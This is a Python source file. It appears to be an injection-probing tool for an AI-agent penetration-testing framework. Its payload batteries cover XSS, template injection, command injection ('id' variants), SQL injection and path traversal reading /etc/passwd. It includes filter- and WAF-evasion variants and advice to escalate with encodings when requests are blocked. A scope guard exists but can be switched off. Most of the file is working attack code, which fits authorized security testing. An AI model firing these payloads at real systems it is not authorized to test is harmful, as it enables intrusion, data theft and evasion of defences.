"""inject_probe — the battery+facts evidence engine. NEVER an oracle.

Tools supply payload BREADTH (the enumerations weak models skip); the
agent crafts the real exploit and confirms. There is deliberately no
'vulnerable'/'success' field — the tool returns FACTS: reflection
context, surviving tags, block signals, error signatures, boolean
differentials against a MEASURED noise floor, and not_tested receipts.

Classes: xss, sstl/ssti, cmd, sqli, lfi (wave 2 core).
Sends ride http_replay's governed engine (pacing, budget, scope).
"""

from __future__ import annotations

import json
import random
import re

from suijin.modules.tools.lib.http_replay import _curl_of, _send

_MAX_SENDS = 120


def _nonce():
    return f"{random.randint(10**7, 10**8 - 1)}"


# ── batteries ────────────────────────────────────────────────────────
_XSS_TAGS = ["img", "svg", "iframe", "video", "audio", "details", "body", "object", "embed", "style", "math"]
_XSS_WEAPONS = [
    "<script>{a}()</script>",
    "<img src=x onerror={a}()>",
    "<svg onload={a}()>",
    "<iframe onload={a}()>",
    "<video onerror={a}()><source src=x>",
    "<body onload={a}()>",
    "<details open ontoggle={a}()>",
    "<img/src=x/onerror={a}()>",           # slash-separated: survives whitespace stripping
    "<svg/onload={a}()>",
    "<math/onload={a}()>",
    "\u003cscript\u003e{a}()",               # unicode-escaped tag open
    "<img src=x onerror=\\u0061lert(1)>",   # unicode call
    "<img src=x onerror=top['al'+'ert'](-1)>",  # property concat
    "<img src=x onerror=({a})()>",           # paren-wrapped call
    '" onmouseover={a}() x="',               # attribute stay-in (double-quoted ctx)
    "' onmouseover={a}() x='",
    "javascript:{a}()",                       # URI context
    "<a href=\"javascript:{a}()\">x</a>",
    "<img src=x onerror={a}&#40;1&#41;>",    # HTML-entity parens
    "<img src=x onerror={a}`x`>",             # backtick arg (BAREARG)
    "<img src=x onerror=/.//.source/{a}>",   # regex-source arg
]
_SSTI_SYNTAXES = [
    "{{7919*6841}}", "{% set x = 7919*6841 %}{{x}}", "${7919*6841}",
    "#{7919*6841}", "<%= 7919*6841 %>", "{{ 7919*6841 }}", "[[7919*6841]]",
    "{{7919*6841|add:0}}", "{(7919*6841)}",
]
_SSTI_PRODUCT = str(7919 * 6841)  # 54172279 — negligible coincidence
_SSTI_LITERALS = ("{{", "}}", "${", "#{", "<%=", "[[", "{%")
_CMD_FORMS = ["id", "i''d", "i\\d", "$(id)", "`id`", ";id;", "|id", "&&id", "\nid\n", "a;id", "ver", "v^er"]
_SQLI_ERRORS = [
    ("mysql", "you have an error in your sql syntax"),
    ("mssql", "unclosed quotation"),
    ("oracle", "ORA-"),
    ("postgres", "PostgreSQL"),
    ("sqlite", "unrecognized token"),
    ("odbc", "OLE DB"),
]
_SQLI_BOOL_PAIRS = [
    ("' AND '1'='1", "' AND '1'='2"),        # AND narrows — safe pair
    ("'/**/AND/**/'1'='1", "'/**/AND/**/'1'='2"),  # comment-separated
    ("'AnD'1'='1", "'AnD'1'='2"),            # case evasion
    ("'or(1)#", "'or(0)#"),                   # spaceless
]
_LFI_SHAPES = [
    "../", "..\\", "..%2f", "..%5c", "%2e%2e%2f", "..%252f", "....//", "....\\/",
    "..;/", "..%00", "%252e%252e%252f",
]
_LFI_TARGETS = [("/etc/passwd", re.compile(r"root:[^:]*:0:0:")), ("/etc/hosts", re.compile(r"127\.0\.0\.1\s+localhost"))]

_WAF_RX = re.compile(r"cloudflare|cf-ray|sucuri|akamai|mod_security|403 forbidden|challenge-platform", re.I)


def _classify_context(body: str, marker: str) -> str:
    """The sink context decides which weapons can fire (FP control)."""
    i = body.find(marker)
    if i < 0:
        return "not_reflected"
    before = body[max(0, i - 120) : i]
    m = re.findall(r"<(\w+)[^>]*$", before)
    if m:
        tag = m[-1].lower()
        if tag in ("script",):
            return "javascript"
        if tag in ("textarea", "title", "style"):
            return f"rcdata-{tag}"
        # inside an attribute?
        seg = before[before.rfind("<" + tag) :] if ("<" + tag) in before else before
        if (seg.count('"') % 2 == 1) or (seg.count("'") % 2 == 1 and '"' not in seg):
            return "attribute"
        return "html-tag-inner"
    return "html-body"


def _probe(base_req: dict, op: str, field: str, payload: str, timeout: int) -> dict:
    from suijin.modules.tools.lib.http_replay import apply_mutation

    r = apply_mutation(dict(base_req), op, field, payload)
    res = _send(r, timeout=timeout)
    return {"payload": payload, "res": res, "req": r}


def inject_probe(
    url: str = "",
    method: str = "GET",
    headers: dict | None = None,
    body: str = "",
    vuln_class: str = "xss",
    field: str = "q",
    in_body: bool = False,
    request_id: str = "",
    timeout: int = 20,
    allow_internal: bool = False,
) -> str:
    """Facts, never verdicts. One class per call against one injection
    point (query param `field`, or body field with in_body=true)."""
    try:
        from suijin.modules.tools.lib.http_replay import _load_request, _scope_guard

        if request_id:
            base = _load_request(str(request_id))
            if base is None:
                return f"Error: request_id '{request_id}' not found"
        else:
            base = {"method": str(method).upper(), "url": str(url), "headers": dict(headers or {}),
                    "body": str(body or ""), "cookies": ""}
        if not base.get("url"):
            return "Error: url (or request_id) required"
        if not allow_internal:
            guard = _scope_guard(base["url"], None)
            if guard:
                return f"Error: {guard}"
        cls = str(vuln_class).lower().strip()
        op = "body-set-field" if in_body else "set-query"
        sends: list[dict] = []
        facts: dict = {"class": cls, "url": base["url"], "field": field, "point": "body" if in_body else "query"}

        def _fire(payload: str) -> dict:
            out = _probe(base, op, field, payload, timeout)
            sends.append(out)
            return out["res"]

        if cls == "xss":
            nonce = _nonce()
            marker = f"zX{nonce}"
            # 1) tag survival battery (slash-form so whitespace filters can't fuse)
            surviving = []
            for tag in _XSS_TAGS[:11]:
                if len(sends) >= _MAX_SENDS - len(_XSS_WEAPONS):
                    break
                res = _fire(f"<{tag}/data-p={marker}>")
                if res.get("status") == 200 and marker in (res.get("body") or ""):
                    surviving.append(tag)
            facts["surviving_tags"] = surviving
            # 2) reflection + context on a bare marker
            res = _fire(marker)
            body_txt = res.get("body") or ""
            reflected = marker in body_txt
            facts["marker_reflected"] = reflected
            facts["marker_html_encoded"] = (marker not in body_txt) and (f"z&#88;{nonce}" in body_txt or f"zx{nonce}" != marker and marker.lower() in body_txt.lower() and marker not in body_txt)
            if reflected:
                facts["context"] = _classify_context(body_txt, marker)
                # 3) weaponized battery (ordered alert-first)
                fired = []
                for w in _XSS_WEAPONS:
                    if len(sends) >= _MAX_SENDS:
                        break
                    r = _fire(w.replace("{a}", "alert"))
                    if r.get("status") == 200 and re.search(r"alert[(&#40;]", r.get("body") or ""):
                        fired.append(w.replace("{a}", "alert"))
                facts["weaponized_reflected"] = fired[:8]
            facts["not_tested_weapons"] = max(0, len(_XSS_WEAPONS) - max(0, len(sends) - 12))
        elif cls == "ssti":
            hits = []
            for syntax in _SSTI_SYNTAXES:
                if len(sends) >= _MAX_SENDS:
                    break
                res = _fire(syntax)
                body_txt = res.get("body") or ""
                if _SSTI_PRODUCT in body_txt and not any(lit in body_txt.split(_SSTI_PRODUCT)[0][-40:] for lit in _SSTI_LITERALS):
                    hits.append(syntax)  # product present, literal absent = EVALUATED (not reflected)
            facts["evaluated_syntaxes"] = hits
            facts["note"] = "product-present + literal-absent = evaluated; literal echo = reflection only"
        elif cls == "cmd":
            outputs = []
            for form in _CMD_FORMS:
                if len(sends) >= _MAX_SENDS:
                    break
                res = _fire(form)
                m = re.search(r"uid=\d+\([^)]+\)", res.get("body") or "")
                if m:
                    outputs.append({"form": form, "output": m.group(0)})  # closed command set: id only
            facts["command_output"] = outputs
        elif cls == "sqli":
            errors = []
            for payload in ["'", "\"", "'\"", "1'", "' -- ", "1)"]:
                if len(sends) >= _MAX_SENDS:
                    break
                res = _fire(payload)
                sigs = [name for name, sig in _SQLI_ERRORS if sig.lower() in (res.get("body") or "").lower()]
                if sigs:
                    errors.append({"payload": payload, "dbms": sigs, "snippet": (res.get("body") or "")[:120]})
            facts["error_findings"] = errors
            # boolean differentials vs a MEASURED noise floor
            noise = []
            for _ in range(2):
                n = _fire(f"z{ _nonce() }")
                noise.append(n.get("length") or 0)
            floor = max(16, (max(noise) - min(noise)) + 8) if noise else 16
            facts["noise_floor_bytes"] = floor
            bools = []
            for t, f in _SQLI_BOOL_PAIRS:
                if len(sends) >= _MAX_SENDS:
                    break
                rt = _fire(t)
                rf = _fire(f)
                delta = abs((rt.get("length") or 0) - (rf.get("length") or 0))
                tms = abs((rt.get("ms") or 0) - (rf.get("ms") or 0))
                if delta > floor or tms >= 200:
                    bools.append({"true": t, "false": f, "delta_bytes": delta, "delta_ms": tms,
                                  "signals": ([s for s in ("length", "timing") if (delta > floor if s == "length" else tms >= 200)])})
            facts["bool_findings"] = bools
        elif cls == "lfi":
            reads = []
            baseline = _fire(f"z{_nonce()}").get("body") or ""
            for shape in _LFI_SHAPES:
                for target, sig in _LFI_TARGETS:
                    if len(sends) >= _MAX_SENDS:
                        break
                    payload = f"{shape * 4}{target}" if not shape.endswith("00") else f"..%00{target}"
                    res = _fire(payload)
                    body_txt = res.get("body") or ""
                    if sig.search(body_txt) and not sig.search(baseline):
                        reads.append({"shape": shape, "target": target})  # signature APPEARED (not inert baseline)
            facts["file_reads"] = reads
            facts["wire_note"] = "payloads fire VERBATIM — the shape IS the wire form"
        else:
            return f"Error: unknown class '{cls}' (xss | ssti | cmd | sqli | lfi)"

        # block-signal qualification on everything we saw
        statuses = [s["res"].get("status") for s in sends]
        blocks = sum(1 for s in statuses if s in (403, 406, 429, 503))
        facts["block_signals"] = blocks
        if blocks > len(sends) * 0.6 and not any(
            facts.get(k) for k in ("surviving_tags", "evaluated_syntaxes", "command_output", "error_findings", "file_reads", "bool_findings", "weaponized_reflected")
        ):
            facts["block_verdict"] = (
                "payloads were WAF/challenge-BLOCKED — this is NOT evidence the endpoint is safe. "
                "Escalate with encoding (http_replay codec=tab/url-double) or a different vantage."
            )
        facts["sends"] = len(sends)
        last_req = sends[-1]["req"] if sends else base
        facts["curl"] = _curl_of(last_req)
        return json.dumps(facts, indent=2)[:6500]
    except Exception as e:  # noqa: BLE001 — tools return strings, never raise
        return f"Error: inject_probe failed: {e}"
